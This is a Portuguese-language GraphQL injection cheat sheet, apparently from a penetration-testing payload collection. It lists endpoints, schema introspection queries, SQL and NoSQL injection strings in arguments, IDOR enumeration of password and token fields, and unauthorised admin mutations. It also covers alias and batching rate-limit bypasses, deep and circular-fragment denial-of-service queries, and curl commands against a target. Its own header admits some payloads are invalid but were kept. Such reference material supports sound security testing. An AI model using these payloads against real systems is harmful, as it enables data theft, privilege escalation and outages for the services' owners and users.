# 📊 Guia de referência de injeção GraphQL

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](GraphQL-Injection.tr.md) • [🇬🇷 Ελληνικά](GraphQL-Injection.el.md)

```
 ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗     
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██║     
██║  ███╗██████╔╝███████║██████╔╝███████║██║   ██║██║     
██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║██║▄▄ ██║██║     
╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝ ╚══════╝
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

> **Notas de precisão:** A [especificação GraphQL](https://spec.graphql.org/September2025/) define introspeção como uma funcionalidade normal, não uma vulnerabilidade por si só. A consulta intitulada «Introspeção completa» é abreviada e não percorre todos os detalhes de tipos envolvidos por listas/non-null. Nomes são sensíveis a maiúsculas/minúsculas; mudá-las não é um contorno genérico. Um ciclo de fragmentos deve ser rejeitado na validação por implementações conformes. O exemplo JSON que insere `$ne` diretamente como nome de campo de entrada não é sintaxe GraphQL válida; aceitar um operador MongoDB exigiria tratamento adicional da aplicação. SQLi/NoSQLi depende dos resolvers, não de GraphQL isoladamente. Aliases, batching e profundidade só contornam limites quando os controlos não os contabilizam corretamente. Os payloads foram preservados.

---

<a id="-graphql-basics"></a>
## 🔍 Noções básicas de GraphQL

### Endpoints comuns
```
/graphql
/graphiql
/v1/graphql
/v2/graphql
/api/graphql
/graph
/query
/gql
/playground
```

### Estrutura dos pedidos
```graphql
# Consulta
{
  user(id: 1) {
    name
    email
  }
}

# Com nome de operação
query GetUser {
  user(id: 1) {
    name
  }
}

# Mutação
mutation {
  createUser(name: "test", email: "test@test.com") {
    id
    name
  }
}
```

---

<a id="-introspection-queries"></a>
## 🎯 Consultas de introspeção

### Introspeção completa do esquema
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### Tipo Query (pontos de entrada)
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Tipo Mutation
```graphql
{
  __schema {
    mutationType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Todos os tipos
```graphql
{
  __schema {
    types {
      name
      kind
      description
    }
  }
}
```

### Detalhes de um tipo específico
```graphql
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

---

<a id="-injection-attacks"></a>
## 💉 Ataques de injeção

### Injeção SQL através de GraphQL
```graphql
# Nos argumentos
{
  user(id: "1' OR '1'='1") {
    name
    email
    password
  }
}

# Baseada em UNION
{
  user(name: "' UNION SELECT username,password FROM users--") {
    name
  }
}
```

### Injeção NoSQL
```graphql
{
  user(username: "{\"$ne\": null}") {
    name
    email
  }
}

# Ou em JSON
{
  "query": "{ user(filter: {username: {$ne: \"\"}}) { name email } }"
}
```

### IDOR (referência direta insegura a objetos)
```graphql
# Aceder aos dados de outros utilizadores
{
  user(id: 1) { name email password }
}
{
  user(id: 2) { name email password }
}
{
  user(id: 3) { name email password }
}

# Enumerar todos os utilizadores
{
  users {
    id
    name
    email
    role
  }
}
```

---

<a id="-authorization-bypass"></a>
## 🔥 Contorno da autorização

### Ausência de autenticação/autorização em mutações
```graphql
# Experimentar operações administrativas como utilizador comum
mutation {
  deleteUser(id: 1) {
    success
  }
}

mutation {
  updateUserRole(id: 1, role: "admin") {
    id
    role
  }
}
```

### Contorno através de consultas aninhadas
```graphql
# Aceder a dados sensíveis através de relações
{
  posts {
    author {
      email
      passwordHash
      adminToken
    }
  }
}

{
  comments {
    user {
      privateMessages {
        content
      }
    }
  }
}
```

### Abuso das sugestões de campos
```graphql
# Se as sugestões estiverem ativadas, experimentar campos inválidos
{
  user(id: 1) {
    passwor  # Pode sugerir "password"
  }
}
```

---

<a id="-information-disclosure"></a>
## 🚀 Divulgação de informação

### Informação de depuração
```graphql
# Enumeração baseada em erros
{
  __typename
}

# Consulta inválida para obter uma stack trace
{
  invalid_field_that_doesnt_exist
}
```

### Descoberta de campos sensíveis
```graphql
{
  user(id: 1) {
    id
    username
    email
    password
    passwordHash
    token
    apiKey
    secret
    privateKey
    ssn
    creditCard
    internalId
  }
}
```

---

<a id="-bypass-techniques"></a>
## 🛡️ Técnicas de contorno de proteções

### Contorno através de aliases
```graphql
# Contornar a limitação do ritmo de pedidos através de aliases
{
  a: user(id: 1) { name }
  b: user(id: 2) { name }
  c: user(id: 3) { name }
  d: user(id: 4) { name }
}
```

### Ataques por agrupamento de consultas (batching)
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

### Alteração de maiúsculas/minúsculas
```graphql
# Experimentar maiúsculas/minúsculas diferentes
{
  USER(id: 1) { name }
}
{
  User(id: 1) { name }
}
```

### Injeção de fragmentos
```graphql
{
  user(id: 1) {
    ...sensitiveData
  }
}

fragment sensitiveData on User {
  password
  apiKey
  token
}
```

---

<a id="-dos-attacks"></a>
## 💣 Ataques de negação de serviço (DoS)

### Ataque com consultas profundas
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
```

### Fragmento circular
```graphql
query {
  user(id: 1) {
    ...A
  }
}

fragment A on User {
  ...B
}

fragment B on User {
  ...A  # Referência circular
}
```

### Conjunto de resultados grande
```graphql
{
  users(first: 999999) {
    id
    name
    email
    posts {
      id
      comments {
        id
      }
    }
  }
}
```

---

<a id="-testing-tools"></a>
## 🛠️ Ferramentas de teste

### GraphQL Voyager
```bash
# Visualizar o esquema
https://graphql-kit.com/graphql-voyager/
# Colar o resultado da introspeção
```

### InQL (extensão do Burp)
```
# Funcionalidades:
- Extração do esquema
- Geração de consultas
- Análise de vulnerabilidades
```

### graphql-cop
```bash
# Ferramenta de auditoria de segurança
pip install graphql-cop
graphql-cop -t https://target.com/graphql
```

### graphw00f
```bash
# Identificação da implementação GraphQL
git clone https://github.com/dolevf/graphw00f
python3 main.py -t https://target.com/graphql
```

### Altair GraphQL Client
```
# Cliente de computador para testes
https://altairgraphql.dev/
```

---

<a id="-curl-examples"></a>
## 📝 Exemplos de cURL

### Consulta básica
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { name email } }"}'
```

### Com variáveis
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query GetUser($id: Int!) { user(id: $id) { name } }", "variables": {"id": 1}}'
```

### Introspeção
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

### Com autenticação
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ me { name } }"}'
```

---

<a id="-testing-checklist"></a>
## 📋 Lista de verificação dos testes

```markdown
## Lista de verificação de segurança GraphQL

□ Identificar endpoints GraphQL
□ Verificar a introspeção (extração do esquema)
□ Extrair todas as consultas e mutações
□ Testar IDOR nas consultas de objetos
□ Testar a autorização nas mutações
□ Verificar a injeção SQL/NoSQL nos argumentos
□ Testar fugas de dados em consultas aninhadas
□ Verificar a limitação do ritmo de pedidos (contorno com aliases)
□ Testar consultas agrupadas
□ Procurar campos sensíveis (password, token)
□ Testar os limites de profundidade (DoS)
□ Verificar a divulgação de erros
□ Testar endpoints de subscrição
```

---

<a id="-common-vulnerabilities-summary"></a>
## 🔗 Resumo das vulnerabilidades comuns

| Vulnerabilidade | Teste | Impacto |
|---------------|------|--------|
| **Introspeção ativada** | Consultar `__schema` | Divulgação do esquema |
| **IDOR** | Alterar os ID nas consultas | Aceder aos dados de outros utilizadores |
| **Ausência de autenticação/autorização** | Consultar sem token | Acesso não autorizado |
| **SQLi/NoSQLi** | Injetar nos argumentos | Comprometimento da base de dados |
| **Dados excessivos** | Consultar campos sensíveis | Fuga de dados |
| **DoS** | Consultas profundas/circulares | Serviço indisponível |
| **Abuso de consultas agrupadas** | Várias consultas | Contorno dos limites de pedidos |

---

<a id="-related-payloads"></a>
## 🔗 Payloads relacionados

- [Payloads de SQLi](SQLi.pt.md)
- [Injeção NoSQL](NoSQL-Injection.pt.md)
- [Segurança de API](../../API-Security/README.md)

---

**Voltar aos payloads:** [💉 Coleção de payloads](../../README.md#-payloads-collection)
